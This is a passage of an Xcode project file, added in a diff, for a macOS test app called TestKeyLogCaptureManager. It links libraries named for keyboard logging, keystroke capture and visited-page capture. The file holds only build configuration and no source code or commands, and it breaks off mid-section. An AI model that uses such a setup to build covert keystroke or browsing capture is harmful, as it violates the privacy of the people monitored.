@@ -1,0 +1,812 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 46;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		352F22DA1A84EC9E00D06E9F /* libKeyboardLoggerManager.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 352F22D91A84E99100D06E9F /* libKeyboardLoggerManager.a */; };
+		352F22DB1A84ECB800D06E9F /* libKeyboardCaptureManager.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C2F163B617FD5FB700347B20 /* libKeyboardCaptureManager.a */; };
+		352F22DC1A84ECC400D06E9F /* libKeyboardEventHandler.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C29A2F401839CE52008867AF /* libKeyboardEventHandler.a */; };
+		352F22DD1A84ECCF00D06E9F /* libFxEventsMac.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C29A30B91839D1CA008867AF /* libFxEventsMac.a */; };
+		352F22DE1A84ECD800D06E9F /* libFxStdMac.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C29A30EF1839D27C008867AF /* libFxStdMac.a */; };
+		352F22DF1A84ECE100D06E9F /* libFMDBMac.a in Frameworks */ = {isa = PBXBuildFile; fileRef = C29A31061839D2E6008867AF /* libFMDBMac.a */; };
+		354A06561AB7F8520029BA7D /* libSystemUtilsMac.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 354A06551AB7F8410029BA7D /* libSystemUtilsMac.a */; };
+		354A065A1AB7F87F0029BA7D /* SystemConfiguration.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 354A06591AB7F87F0029BA7D /* SystemConfiguration.framework */; };
+		354A065C1AB7F88C0029BA7D /* ScriptingBridge.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 354A065B1AB7F88C0029BA7D /* ScriptingBridge.framework */; };
+		354A06631AB7F9230029BA7D /* libPageVisitedCaptureManager.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 354A06621AB7F91C0029BA7D /* libPageVisitedCaptureManager.a */; };
+		C23ED7D617F9504F0037CF6D /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C23ED7D517F9504F0037CF6D /* Cocoa.framework */; };
+		C23ED7E017F9504F0037CF6D /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = C23ED7DE17F9504F0037CF6D /* InfoPlist.strings */; };
+		C23ED7E317F9504F0037CF6D /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = C23ED7E217F9504F0037CF6D /* main.m */; };
+		C23ED7E617F9504F0037CF6D /* Credits.rtf in Resources */ = {isa = PBXBuildFile; fileRef = C23ED7E417F9504F0037CF6D /* Credits.rtf */; };
+		C23ED7E917F9504F0037CF6D /* TestKeyLogCaptureManagerAppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = C23ED7E817F9504F0037CF6D /* TestKeyLogCaptureManagerAppDelegate.m */; };
+		C23ED7EC17F9504F0037CF6D /* MainMenu.xib in Resources */ = {isa = PBXBuildFile; fileRef = C23ED7EA17F9504F0037CF6D /* MainMenu.xib */; };
+		C28F024117FD5D47001360D9 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C28F024017FD5D47001360D9 /* Carbon.framework */; };
+		C298484517F98162003A6391 /* Window.xib in Resources */ = {isa = PBXBuildFile; fileRef = C298484417F98162003A6391 /* Window.xib */; };
+		C298484817F98198003A6391 /* ac.m in Sources */ = {isa = PBXBuildFile; fileRef = C298484717F98198003A6391 /* ac.m */; };
+		C29A30F71839D2CA008867AF /* libsqlite3.0.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = C29A30F61839D2CA008867AF /* libsqlite3.0.dylib */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		352F22D81A84E99100D06E9F /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 352F22D41A84E99100D06E9F /* KeyboardLoggerManager.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 35DDF45A1A84A50E00DDF069;
+			remoteInfo = KeyboardLoggerManager;
+		};
+		352F22E01A84ECFE00D06E9F /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 352F22D41A84E99100D06E9F /* KeyboardLoggerManager.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = 35DDF4591A84A50E00DDF069;
+			remoteInfo = KeyboardLoggerManager;
+		};
+		354A06521AB7F8410029BA7D /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 354A06491AB7F8410029BA7D /* SystemUtils.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = SystemUtils;
+		};
+		354A06541AB7F8410029BA7D /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 354A06491AB7F8410029BA7D /* SystemUtils.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 0840248017F419E7005D14EF;
+			remoteInfo = SystemUtilsMac;
+		};
+		354A06571AB7F8570029BA7D /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 354A06491AB7F8410029BA7D /* SystemUtils.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = 0840247F17F419E7005D14EF;
+			remoteInfo = SystemUtilsMac;
+		};
+		354A06611AB7F91C0029BA7D /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 354A065D1AB7F91C0029BA7D /* PageVisitedCaptureManager.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = C24A006C17FD5EF00073E7F6;
+			remoteInfo = PageVisitedCaptureManager;
+		};
+		354A06641AB7F9270029BA7D /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 354A065D1AB7F91C0029BA7D /* PageVisitedCaptureManager.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = C24A006B17FD5EF00073E7F6;
+			remoteInfo = PageVisitedCaptureManager;
+		};
+		C29A2F3F1839CE52008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A2F381839CE51008867AF /* KeyboardEventHandler.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = C2381F351821FEC6002ED182;
+			remoteInfo = KeyboardEventHandler;
+		};
+		C29A2F411839CE5D008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A2F381839CE51008867AF /* KeyboardEventHandler.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = C2381F341821FEC6002ED182;
+			remoteInfo = KeyboardEventHandler;
+		};
+		C29A30B61839D1CA008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30B11839D1C9008867AF /* FxEvents.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxEvents;
+		};
+		C29A30B81839D1CA008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30B11839D1C9008867AF /* FxEvents.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 08629AF417F957080085D580;
+			remoteInfo = FxEventsMac;
+		};
+		C29A30E01839D1F0008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30B11839D1C9008867AF /* FxEvents.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = 08629AF317F957080085D580;
+			remoteInfo = FxEventsMac;
+		};
+		C29A30EC1839D27C008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30E41839D27C008867AF /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxStd;
+		};
+		C29A30EE1839D27C008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30E41839D27C008867AF /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 0885379A17F98FC900AB08F2;
+			remoteInfo = FxStdMac;
+		};
+		C29A30F01839D287008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30E41839D27C008867AF /* FxStd.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = 0885379917F98FC900AB08F2;
+			remoteInfo = FxStdMac;
+		};
+		C29A31011839D2E6008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30F81839D2E5008867AF /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 8DD76FA10486AA7600D96B5E;
+			remoteInfo = fmdb;
+		};
+		C29A31031839D2E6008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30F81839D2E5008867AF /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = EE4290EF12B42F870088BD94;
+			remoteInfo = FMDB;
+		};
+		C29A31051839D2E6008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30F81839D2E5008867AF /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 08A4D04B18029C15004A2589;
+			remoteInfo = FMDBMac;
+		};
+		C29A31071839D2ED008867AF /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C29A30F81839D2E5008867AF /* fmdb.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = 08A4D04A18029C15004A2589;
+			remoteInfo = FMDBMac;
+		};
+		C2F163B517FD5FB700347B20 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2F163AE17FD5FB600347B20 /* KeyboardCaptureManager.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = C20514C517FD4F2200FC5489;
+			remoteInfo = KeyboardCaptureManager;
+		};
+		C2F163B717FD5FD200347B20 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C2F163AE17FD5FB600347B20 /* KeyboardCaptureManager.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = C20514C417FD4F2200FC5489;
+			remoteInfo = KeyboardCaptureManager;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		352F22D41A84E99100D06E9F /* KeyboardLoggerManager.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = KeyboardLoggerManager.xcodeproj; path = "../../KeyboardLoggerManager/Source-KeyboardLoggerManager/KeyboardLoggerManager.xcodeproj"; sourceTree = "<group>"; };
+		354A06491AB7F8410029BA7D /* SystemUtils.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = SystemUtils.xcodeproj; path = "../../SystemUtils/Source-SystemUtils/SystemUtils.xcodeproj"; sourceTree = "<group>"; };
+		354A06591AB7F87F0029BA7D /* SystemConfiguration.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SystemConfiguration.framework; path = System/Library/Frameworks/SystemConfiguration.framework; sourceTree = SDKROOT; };
+		354A065B1AB7F88C0029BA7D /* ScriptingBridge.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ScriptingBridge.framework; path = System/Library/Frameworks/ScriptingBridge.framework; sourceTree = SDKROOT; };
+		354A065D1AB7F91C0029BA7D /* PageVisitedCaptureManager.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = PageVisitedCaptureManager.xcodeproj; path = "../../PageVisitedCaptureManager/Source-PageVisitedCaptureManager/PageVisitedCaptureManager.xcodeproj"; sourceTree = "<group>"; };
+		C23ED7D117F9504F0037CF6D /* TestKeyLogCaptureManager.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TestKeyLogCaptureManager.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		C23ED7D517F9504F0037CF6D /* Cocoa.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Cocoa.framework; path = System/Library/Frameworks/Cocoa.framework; sourceTree = SDKROOT; };
+		C23ED7D817F9504F0037CF6D /* AppKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AppKit.framework; path = System/Library/Frameworks/AppKit.framework; sourceTree = SDKROOT; };
+		C23ED7D917F9504F0037CF6D /* CoreData.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreData.framework; path = System/Library/Frameworks/CoreData.framework; sourceTree = SDKROOT; };
+		C23ED7DA17F9504F0037CF6D /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = System/Library/Frameworks/Foundation.framework; sourceTree = SDKROOT; };
+		C23ED7DD17F9504F0037CF6D /* TestKeyLogCaptureManager-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "TestKeyLogCaptureManager-Info.plist"; sourceTree = "<group>"; };
+		C23ED7DF17F9504F0037CF6D /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/InfoPlist.strings; sourceTree = "<group>"; };
+		C23ED7E117F9504F0037CF6D /* TestKeyLogCaptureManager-Prefix.pch */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "TestKeyLogCaptureManager-Prefix.pch"; sourceTree = "<group>"; };
+		C23ED7E217F9504F0037CF6D /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		C23ED7E517F9504F0037CF6D /* en */ = {isa = PBXFileReference; lastKnownFileType = text.rtf; name = en; path = en.lproj/Credits.rtf; sourceTree = "<group>"; };
+		C23ED7E717F9504F0037CF6D /* TestKeyLogCaptureManagerAppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TestKeyLogCaptureManagerAppDelegate.h; sourceTree = "<group>"; };
+		C23ED7E817F9504F0037CF6D /* TestKeyLogCaptureManagerAppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TestKeyLogCaptureManagerAppDelegate.m; sourceTree = "<group>"; };
+		C23ED7EB17F9504F0037CF6D /* en */ = {isa = PBXFileReference; lastKnownFileType = file.xib; name = en; path = en.lproj/MainMenu.xib; sourceTree = "<group>"; };
+		C28F024017FD5D47001360D9 /* Carbon.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Carbon.framework; path = System/Library/Frameworks/Carbon.framework; sourceTree = SDKROOT; };
+		C298484417F98162003A6391 /* Window.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; name = Window.xib; path = ../Window.xib; sourceTree = "<group>"; };
+		C298484617F98198003A6391 /* ac.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ac.h; sourceTree = "<group>"; };
+		C298484717F98198003A6391 /* ac.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ac.m; sourceTree = "<group>"; };
+		C29A2F381839CE51008867AF /* KeyboardEventHandler.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = KeyboardEventHandler.xcodeproj; path = "../../KeyboardEventHandler/Source-KeyboardEventHandler/KeyboardEventHandler.xcodeproj"; sourceTree = "<group>"; };
+		C29A30B11839D1C9008867AF /* FxEvents.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxEvents.xcodeproj; path = ../../Events/FxEvents/FxEvents.xcodeproj; sourceTree = "<group>"; };
+		C29A30E41839D27C008867AF /* FxStd.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxStd.xcodeproj; path = ../../Std/FxStd/FxStd.xcodeproj; sourceTree = "<group>"; };
+		C29A30F61839D2CA008867AF /* libsqlite3.0.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libsqlite3.0.dylib; path = usr/lib/libsqlite3.0.dylib; sourceTree = SDKROOT; };
+		C29A30F81839D2E5008867AF /* fmdb.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = fmdb.xcodeproj; path = "../../ccgus-fmdb-606b29d/fmdb.xcodeproj"; sourceTree = "<group>"; };
+		C2F163AE17FD5FB600347B20 /* KeyboardCaptureManager.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = KeyboardCaptureManager.xcodeproj; path = "../Source-KeyboardCaptureManager/KeyboardCaptureManager.xcodeproj"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		C23ED7CE17F9504F0037CF6D /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				354A06631AB7F9230029BA7D /* libPageVisitedCaptureManager.a in Frameworks */,
+				354A06561AB7F8520029BA7D /* libSystemUtilsMac.a in Frameworks */,
+				352F22DA1A84EC9E00D06E9F /* libKeyboardLoggerManager.a in Frameworks */,
+				352F22DF1A84ECE100D06E9F /* libFMDBMac.a in Frameworks */,
+				352F22DE1A84ECD800D06E9F /* libFxStdMac.a in Frameworks */,
+				352F22DD1A84ECCF00D06E9F /* libFxEventsMac.a in Frameworks */,
+				352F22DC1A84ECC400D06E9F /* libKeyboardEventHandler.a in Frameworks */,
+				352F22DB1A84ECB800D06E9F /* libKeyboardCaptureManager.a in Frameworks */,
+				C29A30F71839D2CA008867AF /* libsqlite3.0.dylib in Frameworks */,
+				354A065C1AB7F88C0029BA7D /* ScriptingBridge.framework in Frameworks */,
+				354A065A1AB7F87F0029BA7D /* SystemConfiguration.framework in Frameworks */,
+				C28F024117FD5D47001360D9 /* Carbon.framework in Frameworks */,
+				C23ED7D617F9504F0037CF6D /* Cocoa.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		352F22D51A84E99100D06E9F /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				352F22D91A84E99100D06E9F /* libKeyboardLoggerManager.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		354A064A1AB7F8410029BA7D /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				354A06531AB7F8410029BA7D /* libSystemUtils.a */,
+				354A06551AB7F8410029BA7D /* libSystemUtilsMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		354A065E1AB7F91C0029BA7D /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				354A06621AB7F91C0029BA7D /* libPageVisitedCaptureManager.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C23ED7C617F9504F0037CF6D = {
+			isa = PBXGroup;
+			children = (
+				C29A30F51839D29E008867AF /* Library */,
+				C29A30F41839D293008867AF /* Lib */,
+				C23ED7DB17F9504F0037CF6D /* TestKeyLogCaptureManager */,
+				C23ED7D417F9504F0037CF6D /* Frameworks */,
+				C23ED7D217F9504F0037CF6D /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		C23ED7D217F9504F0037CF6D /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C23ED7D117F9504F0037CF6D /* TestKeyLogCaptureManager.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C23ED7D417F9504F0037CF6D /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				C29A30F61839D2CA008867AF /* libsqlite3.0.dylib */,
+				354A065B1AB7F88C0029BA7D /* ScriptingBridge.framework */,
+				354A06591AB7F87F0029BA7D /* SystemConfiguration.framework */,
+				C28F024017FD5D47001360D9 /* Carbon.framework */,
+				C23ED7D517F9504F0037CF6D /* Cocoa.framework */,
+				C23ED7D717F9504F0037CF6D /* Other Frameworks */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		C23ED7D717F9504F0037CF6D /* Other Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				C23ED7D817F9504F0037CF6D /* AppKit.framework */,
+				C23ED7D917F9504F0037CF6D /* CoreData.framework */,
+				C23ED7DA17F9504F0037CF6D /* Foundation.framework */,
+			);
+			name = "Other Frameworks";
+			sourceTree = "<group>";
+		};
+		C23ED7DB17F9504F0037CF6D /* TestKeyLogCaptureManager */ = {
+			isa = PBXGroup;
+			children = (
+				C298484617F98198003A6391 /* ac.h */,
+				C298484717F98198003A6391 /* ac.m */,
+				C23ED7E717F9504F0037CF6D /* TestKeyLogCaptureManagerAppDelegate.h */,
+				C23ED7E817F9504F0037CF6D /* TestKeyLogCaptureManagerAppDelegate.m */,
+				C298484417F98162003A6391 /* Window.xib */,
+				C23ED7EA17F9504F0037CF6D /* MainMenu.xib */,
+				C23ED7DC17F9504F0037CF6D /* Supporting Files */,
+			);
+			path = TestKeyLogCaptureManager;
+			sourceTree = "<group>";
+		};
+		C23ED7DC17F9504F0037CF6D /* Supporting Files */ = {
+			isa = PBXGroup;
+			children = (
+				C23ED7DD17F9504F0037CF6D /* TestKeyLogCaptureManager-Info.plist */,
+				C23ED7DE17F9504F0037CF6D /* InfoPlist.strings */,
+				C23ED7E117F9504F0037CF6D /* TestKeyLogCaptureManager-Prefix.pch */,
+				C23ED7E217F9504F0037CF6D /* main.m */,
+				C23ED7E417F9504F0037CF6D /* Credits.rtf */,
+			);
+			name = "Supporting Files";
+			sourceTree = "<group>";
+		};
+		C29A2F391839CE51008867AF /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C29A2F401839CE52008867AF /* libKeyboardEventHandler.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C29A30B21839D1C9008867AF /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C29A30B71839D1CA008867AF /* libFxEvents.a */,
+				C29A30B91839D1CA008867AF /* libFxEventsMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C29A30E51839D27C008867AF /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C29A30ED1839D27C008867AF /* libFxStd.a */,
+				C29A30EF1839D27C008867AF /* libFxStdMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C29A30F41839D293008867AF /* Lib */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			name = Lib;
+			sourceTree = "<group>";
+		};
+		C29A30F51839D29E008867AF /* Library */ = {
+			isa = PBXGroup;
+			children = (
+				354A065D1AB7F91C0029BA7D /* PageVisitedCaptureManager.xcodeproj */,
+				354A06491AB7F8410029BA7D /* SystemUtils.xcodeproj */,
+				352F22D41A84E99100D06E9F /* KeyboardLoggerManager.xcodeproj */,
+				C29A30F81839D2E5008867AF /* fmdb.xcodeproj */,
+				C29A30E41839D27C008867AF /* FxStd.xcodeproj */,
+				C29A30B11839D1C9008867AF /* FxEvents.xcodeproj */,
+				C29A2F381839CE51008867AF /* KeyboardEventHandler.xcodeproj */,
+				C2F163AE17FD5FB600347B20 /* KeyboardCaptureManager.xcodeproj */,
+			);
+			name = Library;
+			sourceTree = "<group>";
+		};
+		C29A30F91839D2E5008867AF /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C29A31021839D2E6008867AF /* fmdb */,
+				C29A31041839D2E6008867AF /* libFMDB.a */,
+				C29A31061839D2E6008867AF /* libFMDBMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C2F163AF17FD5FB600347B20 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C2F163B617FD5FB700347B20 /* libKeyboardCaptureManager.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		C23ED7D017F9504F0037CF6D /* TestKeyLogCaptureManager */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C23ED7EF17F9504F0037CF6D /* Build configuration list for PBXNativeTarget "TestKeyLogCaptureManager" */;
+			buildPhases = (
+				C23ED7CD17F9504F0037CF6D /* Sources */,
+				C23ED7CE17F9504F0037CF6D /* Frameworks */,
+				C23ED7CF17F9504F0037CF6D /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				354A06651AB7F9270029BA7D /* PBXTargetDependency */,
+				354A06581AB7F8570029BA7D /* PBXTargetDependency */,
+				352F22E11A84ECFE00D06E9F /* PBXTargetDependency */,
+				C29A31081839D2ED008867AF /* PBXTargetDependency */,
+				C29A30F11839D287008867AF /* PBXTargetDependency */,
+				C29A30E11839D1F0008867AF /* PBXTargetDependency */,
+				C29A2F421839CE5D008867AF /* PBXTargetDependency */,
+				C2F163B817FD5FD200347B20 /* PBXTargetDependency */,
+			);
+			name = TestKeyLogCaptureManager;
+			productName = TestKeyLogCaptureManager;
+			productReference = C23ED7D117F9504F0037CF6D /* TestKeyLogCaptureManager.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		C23ED7C817F9504F0037CF6D /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+			};
+			buildConfigurationList = C23ED7CB17F9504F0037CF6D /* Build configuration list for PBXProject "TestKeyLogCaptureManager" */;
+			compatibilityVersion = "Xcode 3.2";
+			developmentRegion = English;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+			);
+			mainGroup = C23ED7C617F9504F0037CF6D;
+			productRefGroup = C23ED7D217F9504F0037CF6D /* Products */;
+			projectDirPath = "";
+			projectReferences = (
+				{
+					ProductGroup = C29A30F91839D2E5008867AF /* Products */;
+					ProjectRef = C29A30F81839D2E5008867AF /* fmdb.xcodeproj */;
+				},
+				{
+					ProductGroup = C29A30B21839D1C9008867AF /* Products */;
+					ProjectRef = C29A30B11839D1C9008867AF /* FxEvents.xcodeproj */;
+				},
+				{
+					ProductGroup = C29A30E51839D27C008867AF /* Products */;
+					ProjectRef = C29A30E41839D27C008867AF /* FxStd.xcodeproj */;
+				},
+				{
+					ProductGroup = C2F163AF17FD5FB600347B20 /* Products */;
+					ProjectRef = C2F163AE17FD5FB600347B20 /* KeyboardCaptureManager.xcodeproj */;
+				},
+				{
+					ProductGroup = C29A2F391839CE51008867AF /* Products */;
+					ProjectRef = C29A2F381839CE51008867AF /* KeyboardEventHandler.xcodeproj */;
+				},
+				{
+					ProductGroup = 352F22D51A84E99100D06E9F /* Products */;
+					ProjectRef = 352F22D41A84E99100D06E9F /* KeyboardLoggerManager.xcodeproj */;
+				},
+				{
+					ProductGroup = 354A065E1AB7F91C0029BA7D /* Products */;
+					ProjectRef = 354A065D1AB7F91C0029BA7D /* PageVisitedCaptureManager.xcodeproj */;
+				},
+				{
+					ProductGroup = 354A064A1AB7F8410029BA7D /* Products */;
+					ProjectRef = 354A06491AB7F8410029BA7D /* SystemUtils.xcodeproj */;
+				},
+			);
+			projectRoot = "";
+			targets = (
+				C23ED7D017F9504F0037CF6D /* TestKeyLogCaptureManager */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXReferenceProxy section */
+		352F22D91A84E99100D06E9F /* libKeyboardLoggerManager.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libKeyboardLoggerManager.a;
+			remoteRef = 352F22D81A84E99100D06E9F /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		354A06531AB7F8410029BA7D /* libSystemUtils.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libSystemUtils.a;
+			remoteRef = 354A06521AB7F8410029BA7D /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		354A06551AB7F8410029BA7D /* libSystemUtilsMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libSystemUtilsMac.a;
+			remoteRef = 354A06541AB7F8410029BA7D /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		354A06621AB7F91C0029BA7D /* libPageVisitedCaptureManager.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libPageVisitedCaptureManager.a;
+			remoteRef = 354A06611AB7F91C0029BA7D /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A2F401839CE52008867AF /* libKeyboardEventHandler.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libKeyboardEventHandler.a;
+			remoteRef = C29A2F3F1839CE52008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A30B71839D1CA008867AF /* libFxEvents.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxEvents.a;
+			remoteRef = C29A30B61839D1CA008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A30B91839D1CA008867AF /* libFxEventsMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxEventsMac.a;
+			remoteRef = C29A30B81839D1CA008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A30ED1839D27C008867AF /* libFxStd.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxStd.a;
+			remoteRef = C29A30EC1839D27C008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A30EF1839D27C008867AF /* libFxStdMac.a */ = {
